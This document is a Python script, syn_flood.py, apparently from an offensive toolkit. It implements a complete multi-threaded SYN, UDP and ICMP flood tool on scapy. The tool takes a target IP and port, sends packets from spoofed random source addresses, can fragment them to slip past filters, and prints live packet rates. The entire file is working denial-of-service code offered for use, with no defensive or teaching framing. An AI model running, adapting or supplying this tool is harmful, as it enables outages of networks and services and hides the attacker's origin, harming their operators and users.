
# =============================================================================
# Filename   : syn_flood.py
# Description: Multi-mode flood tool (SYN / UDP / ICMP) with rate control,
#              optional fragmentation, and live statistics.
#              Part of PARALELEPIPEDO Toolkit.
# Author     : PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import random
import signal
import sys
import time
import threading

from colorama import Fore, Style, init
from scapy.all import (
    IP, TCP, UDP, ICMP,
    RandShort, RandIP,
    fragment, send, conf
)

init(autoreset=True)

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------
_running      = True
_lock         = threading.Lock()
_pkts_sent    = 0
_bytes_sent   = 0
_start_time   = None


def info(msg):  print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def warn(msg):  print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def err(msg):   print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")


# ---------------------------------------------------------------------------
# Signal handler
# ---------------------------------------------------------------------------

def _signal_handler(sig, frame):
    global _running
    _running = False


# ---------------------------------------------------------------------------
# Stats printer
# ---------------------------------------------------------------------------

def stats_thread(duration: float | None):
    """Print live stats every second until stopped or duration expires."""
    global _running
    interval_pkts = 0
    last_check    = time.time()

    while _running:
        time.sleep(0.5)
        now     = time.time()
        elapsed = now - _start_time
        if duration and elapsed >= duration:
            _running = False
            break

        with _lock:
            total_p = _pkts_sent
            total_b = _bytes_sent

        dt       = now - last_check
        cur_pps  = (total_p - interval_pkts) / dt if dt > 0 else 0
        interval_pkts = total_p
        last_check    = now

        print(
            f"\r{Fore.CYAN}[STATS]{Style.RESET_ALL} "
            f"Pkts: {total_p:>8}  |  "
            f"Bytes: {total_b:>10}  |  "
            f"PPS: {cur_pps:>8.0f}  |  "
            f"Elapsed: {elapsed:>6.1f}s   ",
            end="",
            flush=True,
        )


# ---------------------------------------------------------------------------
# Token-bucket rate limiter
# ---------------------------------------------------------------------------

class TokenBucket:
    def __init__(self, rate: float):
        """rate = tokens (packets) per second."""
        self._rate      = rate
        self._tokens    = rate
        self._last_time = time.monotonic()
        self._lock      = threading.Lock()

    def consume(self):
        """Block until a token is available."""
        while True:
            with self._lock:
                now    = time.monotonic()
                delta  = now - self._last_time
                self._tokens    = min(self._rate, self._tokens + delta * self._rate)
                self._last_time = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return
            time.sleep(0.0005)


# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def make_syn(target: str, port: int) -> IP:
    src_ip  = str(RandIP())
    src_port = random.randint(1024, 65535)
    return IP(src=src_ip, dst=target) / TCP(sport=src_port, dport=port, flags="S", seq=random.randint(0, 2**32-1))


def make_udp(target: str, port: int) -> IP:
    src_ip   = str(RandIP())
    src_port = random.randint(1024, 65535)
    payload  = bytes([random.randint(0, 255) for _ in range(random.randint(32, 512))])
    return IP(src=src_ip, dst=target) / UDP(sport=src_port, dport=port) / payload


def make_icmp(target: str) -> IP:
    src_ip  = str(RandIP())
    payload = bytes([random.randint(0, 255) for _ in range(56)])
    return IP(src=src_ip, dst=target) / ICMP() / payload


# ---------------------------------------------------------------------------
# Send loop
# ---------------------------------------------------------------------------

def flood_loop(target: str, port: int, mode: str,
               do_fragment: bool, bucket: TokenBucket | None):
    global _pkts_sent, _bytes_sent

    while _running:
        if bucket:
            bucket.consume()

        if mode == "syn":
            pkt = make_syn(target, port)
        elif mode == "udp":
            pkt = make_udp(target, port)
        else:  # icmp
            pkt = make_icmp(target)

        if do_fragment:
            frags = fragment(pkt, fragsize=8)
            for f in frags:
                send(f, verbose=False)
            pkt_count = len(frags)
            byte_count = sum(len(bytes(f)) for f in frags)
        else:
            send(pkt, verbose=False)
            pkt_count  = 1
            byte_count = len(bytes(pkt))

        with _lock:
            _pkts_sent  += pkt_count
            _bytes_sent += byte_count


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="PARALELEPIPEDO Toolkit – Multi-mode Flood Tool"
    )
    p.add_argument("--target",   required=True, help="Target IP address")
    p.add_argument("--port",     type=int, default=80,
                   help="Target port (for SYN/UDP, default: 80)")
    p.add_argument("--pps",      type=float, default=0,
                   help="Max packets per second (0 = unlimited)")
    p.add_argument("--mode",     choices=["syn", "udp", "icmp"], default="syn",
                   help="Flood mode: syn|udp|icmp (default: syn)")
    p.add_argument("--fragment", action="store_true",
                   help="Fragment IP packets before sending")
    p.add_argument("--duration", type=float, default=0,
                   help="Stop after N seconds (0 = run until Ctrl+C)")
    p.add_argument("--threads",  type=int, default=1,
                   help="Number of sending threads (default: 1)")
    return p.parse_args()


def main():
    global _start_time

    args = parse_args()
    signal.signal(signal.SIGINT, _signal_handler)

    conf.verb = 0

    bucket = TokenBucket(args.pps) if args.pps > 0 else None

    info(f"Mode     : {args.mode.upper()}")
    info(f"Target   : {args.target}:{args.port}")
    info(f"PPS limit: {'unlimited' if not bucket else args.pps}")
    info(f"Fragment : {args.fragment}")
    info(f"Duration : {'until Ctrl+C' if args.duration == 0 else f'{args.duration}s'}")
    info(f"Threads  : {args.threads}")
    info("Starting flood... (Ctrl+C to stop)\n")

    _start_time = time.time()

    # Stats thread
    st = threading.Thread(
        target=stats_thread, args=(args.duration or None,), daemon=True
    )
    st.start()

    # Sender threads
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=flood_loop,
            args=(args.target, args.port, args.mode, args.fragment, bucket),
            daemon=True,
        )
        t.start()
        threads.append(t)

    # Wait for duration or signal
    try:
        while _running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    _running_local = False  # noqa: F841  (signal already set global)

    print()
    elapsed = time.time() - _start_time
    info(f"Stopped. Packets sent: {_pkts_sent}  |  Bytes: {_bytes_sent}  |  Time: {elapsed:.1f}s")
    avg_pps = _pkts_sent / elapsed if elapsed > 0 else 0
    info(f"Average PPS: {avg_pps:.1f}")


if __name__ == "__main__":
    main()
